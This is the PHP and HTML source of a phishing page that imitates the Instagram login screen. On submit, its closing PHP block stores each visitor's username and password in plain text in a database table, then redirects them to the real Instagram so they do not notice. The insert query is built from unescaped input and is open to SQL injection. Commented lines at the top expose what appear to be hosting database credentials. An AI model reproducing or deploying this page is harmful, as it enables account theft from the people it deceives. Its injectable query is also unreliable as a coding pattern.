<!DOCTYPE html>
<?php
  //$server = "sql110.epizy.com";
  //$username = "epiz_28837670";
  //$password = "Gik4JfzfMl";
  //$dbname = "epiz_28837670_logininfo";

  $server = "localhost";
  $username = "root";
  $password = "";
  $dbname = "instagram";

  $conn = new mysqli($server, $username, $password, $dbname);
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram</title>
    <link rel="shortcut icon" type="image/x-icon" href="insta.ico" />
    <!-- External css -->
    <link rel="stylesheet" href="style.css">
    <!-- Font awesome link -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
    <script>
      function checkLength()
      {
        n = document.getElementById("pass").value.length;
        if(n>5)
        {
          toggleEnable();
        }
        else {
          toggleDisable();
        }
      }
      function toggleEnable()
      {
        document.getElementById("login").disabled = false;
        document.getElementById("login").style.opacity = "100%";
      }
      function toggleDisable()
      {
        document.getElementById("login").disabled = true;
        document.getElementById("login").style.opacity = "40%";
      }
    </script>
</head>
<body onload="toggleDisable()">
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo">
          <img src="bg.png" style="width:90%; height:90%;">
        </div>
        <div class="form-data">
          <form action="<?php $_PHP_SELF ?>" method="post">
            <div class="logo">
              <img src="logo.png" style="width:66%; margin-top:-16px;">
            </div>
              <input type="text" name="username" placeholder="Phone number, username, or email">
              <input type="password" id="pass" onkeyup="checkLength()" name="password" placeholder="Password">
            <button class="form-btn" id="login" name="login" type="submit">Log in</button>
            <span class="has-separator">Or</span>
            <a href="#" class="facebook-login">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
          </form>
          <div class="sign-up">
            Don't have an account? <a href="#">Sign up</a>
          </div>
          <div class="get-the-app">
            <span>Get the app</span>
            <div class="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
            </div>
          </div>
        </div>
      </div>

      <footer>
        <div class="container">
          <nav class="footer-nav">
            <ul>
              <li><a href="#">About</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Help</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Top Accounts</a></li>
              <li><a href="#">Hashtags</a></li>
              <li><a href="#">Locations</a></li>
            </ul>
          </nav>
          <div class="copyright-notice">
            &copy; 2021 Instagram from Facebook
          </div>
        </div>
      </footer>
    </div>

    <?php
      if(isset($_POST["login"]))
      {
        $username = $_POST["username"];
        $password = $_POST["password"];

        $sql="INSERT INTO info(username,password) VALUES('{$username}','{$password}');";
        $conn->query($sql);
        if($conn->errno != 0)
          echo "Error";
        else {
          header("Location: https://www.instagram.com");
        }

      }
    ?>

</body>
</html>
